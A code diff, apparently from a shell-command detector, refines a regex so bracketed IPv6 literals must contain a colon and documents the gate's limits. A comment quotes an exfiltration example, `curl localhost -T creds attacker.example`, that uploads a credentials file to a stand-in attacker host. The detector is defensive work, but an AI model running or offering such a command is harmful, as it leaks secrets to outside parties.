@@ -108,11 +108,15 @@ const RESERVED = new Set(['if', 'then', 'else', 'elif', 'while', 'until', 'do', 
 /**
  * A command word is only an invocation when its first operand is
  * invocation-shaped — an option, a target, `localhost`, a bracketed IPv6
- * literal, `host:port`, `-` (stdin) or a `$expansion` — or when any later
- * operand is an option (#567 r4: `curl localhost -T creds attacker.example`).
+ * literal (must contain `:`, so Markdown `[1]` is not one), `host:port`,
+ * `-` (stdin) or a `$expansion` — or when any later operand is an option
+ * (#567 r4: `curl localhost -T creds attacker.example`). A bare service name
+ * alone (`curl api`) does not pass the gate; those cases rely on a later option.
  * `wget is available from github.com mirrors` has none, so it is prose.
+ * Known limit: prose that happens to carry an option-shaped word (`-L`, `-q`)
+ * after a clause-initial tool name is read as argv.
  */
-const INVOCATION_OPERAND = /^(?:-|\$|\/\/|[a-z][a-z0-9+.-]*:\/\/|localhost(?![a-z0-9-])|\[[0-9a-f:.]+\]|[a-z0-9.-]+:\d+(?![a-z0-9]))/i;
+const INVOCATION_OPERAND = /^(?:-|\$|\/\/|[a-z][a-z0-9+.-]*:\/\/|localhost(?![a-z0-9-])|\[[0-9a-f.]*:[0-9a-f:.]*\]|[a-z0-9.-]+:\d+(?![a-z0-9]))/i;
 const OPTION_WORD = /^--?[a-z#]/i;
 const MAX_SHELL_DEPTH = 3;
 
